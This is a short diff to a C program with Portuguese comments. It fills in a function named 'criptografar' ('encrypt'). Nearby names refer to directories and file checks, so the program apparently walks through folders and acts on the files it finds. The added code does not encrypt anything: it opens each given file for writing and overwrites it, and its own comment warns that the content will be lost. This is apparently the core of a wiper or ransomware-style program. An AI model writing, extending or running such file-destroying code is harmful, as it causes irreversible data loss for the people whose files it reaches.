@@ -103,7 +103,19 @@ void localedir(char *nome_diretorio){
 }
 
 void criptografar(char *criptografa){
-	//RETURN 0;
+	// Abre o arquivo
+	FILE *arq = fopen(criptografa,"w");
+	if(arq == NULL)
+	{
+		fprintf(stderr , "[ERRO]: Erro ao abrir arquivo");
+		return;
+	}
+
+	// Sobrescreve o arquivo (O CONTEUDO SERA PERDIDO)
+	fputs(arquivo , arq);
+	fclose(arq);
+
+	return;
 }
 
 int isFile(const char* name)
